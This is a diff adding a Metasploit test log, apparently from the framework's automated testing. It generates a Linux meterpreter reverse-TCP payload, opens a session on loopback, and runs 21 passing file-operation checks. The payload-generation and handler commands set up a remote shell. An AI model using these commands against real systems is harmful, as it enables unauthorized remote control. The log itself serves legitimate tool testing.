@@ -1,0 +1,68 @@
+use linux/x64/meterpreter/reverse_tcp
+Stopping all jobs...
+[4mmsf6[0m post([1m[31mtest/unix[0m) [0m> irb -e '(self.respond_to?(:framework) ? framework : self).datastore.user_defined.clear'
+setg SessionTlvLogging file:/tmp/linuxx64meterpreterreverse_tcp_session_tlv_logging20240307-2884-wcwto2txt
+[4mmsf6[0m payload([1m[31mlinux/x64/meterpreter/reverse_tcp[0m) [0m> generate -o /tmp/child-process-rb-linux-x---meterpreter-reverse-tcp20240307-2884-sdlfwf -f elf AutoVerifySessionTimeout=30 lport=6004 lhost=127.0.0.1 MeterpreterDebugLogging=rpath:/tmp/linuxx64meterpreterreverse_tcp_debug_log20240307-2884-9bedpetxt MeterpreterTryToFork=false MeterpreterDebugBuild=true
+[4mmsf6[0m payload([1m[31mlinux/x64/meterpreter/reverse_tcp[0m) [0m> SessionTlvLogging => file:/tmp/linuxx64meterpreterreverse_tcp_session_tlv_logging20240307-2884-wcwto2txt
+[4mmsf6[0m payload([1m[31mlinux/x64/meterpreter/reverse_tcp[0m) [0m> [*] Writing 250 bytes to /tmp/child-process-rb-linux-x---meterpreter-reverse-tcp20240307-2884-sdlfwf...
+[4mmsf6[0m payload([1m[31mlinux/x64/meterpreter/reverse_tcp[0m) [0m> to_handler AutoVerifySessionTimeout=30 lport=6004 lhost=127.0.0.1 MeterpreterDebugLogging=rpath:/tmp/linuxx64meterpreterreverse_tcp_debug_log20240307-2884-9bedpetxt MeterpreterTryToFork=false MeterpreterDebugBuild=true
+[*] Payload Handler Started as Job 3
+[4mmsf6[0m payload([1m[31mlinux/x64/meterpreter/reverse_tcp[0m) [0m> 
+[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[*] Started reverse TCP handler on 127.0.0.1:6004 
+[*] Sending stage (3045380 bytes) to 127.0.0.1
+[*] Meterpreter session 4 opened (127.0.0.1:6004 -> 127.0.0.1:55062) at 2024-03-07 09:37:43 +0000
+use test/file
+[4mmsf6[0m post([1m[31mtest/file[0m) [0m> run session=4 AddEntropy=true Verbose=true
+[*] Setup: changing working directory to tmp: /tmp
+[*] Setup: Creating clean directory
+[*] Creating directory meterpreter-test-dir-pviwofyn
+[*] meterpreter-test-dir-pviwofyn created
+[*] Setup: Now in /tmp/meterpreter-test-dir-pviwofyn
+[*] Running against session 4
+[*] Session type is meterpreter and platform is linux
+[*] [should write binary data] Writing 128000 bytes
+[*] [should write binary data] Finished in 0.044147064
+[+] should write binary data
+[*] [should read the binary data we just wrote] Read 128000 bytes
+[+] should read the binary data we just wrote
+[+] should delete binary files
+[*] [should append binary data] expected: [222, 173, 190, 239] - ASCII-8BIT
+[*] [should append binary data] actual: [222, 173, 190, 239] - ASCII-8BIT
+[+] should append binary data
+[+] should expand home
+[+] should not expand non-isolated tilde
+[+] should not expand mid-string tilde
+[+] should not expand env vars with invalid naming
+[+] should expand multiple variables
+[+] should test for file existence
+[+] should create text files
+[+] should read the text we just wrote
+[+] should append text files
+[+] should delete text files
+[+] should move files
+[+] should test for directory existence
+[*] [should create directories] Creating directory meterpreter-test-dir
+[*] [should create directories] meterpreter-test-dir created
+[*] [should create directories] Creating directory meterpreter-test-dir/directory
+[*] [should create directories] meterpreter-test-dir/directory created
+[+] should create directories
+[+] should list the directory we just made
+[+] should recursively delete the directory we just made
+[*] [should delete a symbolic link target] Creating directory meterpreter-test-dir
+[*] [should delete a symbolic link target] meterpreter-test-dir created
+[+] should delete a symbolic link target
+[*] [should not recurse into symbolic link directories] Creating directory meterpreter-test-dir.1
+[*] [should not recurse into symbolic link directories] meterpreter-test-dir.1 created
+[*] [should not recurse into symbolic link directories] Creating directory meterpreter-test-dir.2
+[*] [should not recurse into symbolic link directories] meterpreter-test-dir.2 created
+[+] should not recurse into symbolic link directories
+[*] Testing complete in 3.89 seconds
+[*] Passed: 21; Failed: 0; Skipped: 0
+[*] Cleanup: changing working directory back to /home/runner/work/metasploit-framework/metasploit-framework
+[*] Post module execution completed
+sessions -K
+[4mmsf6[0m post([1m[31mtest/file[0m) [0m> jobs -K
+[*] Killing all sessions...
+[*] 127.0.0.1 - Meterpreter session 4 closed.
+[4mmsf6[0m post([1m[31mtest/file[0m) [0m> 
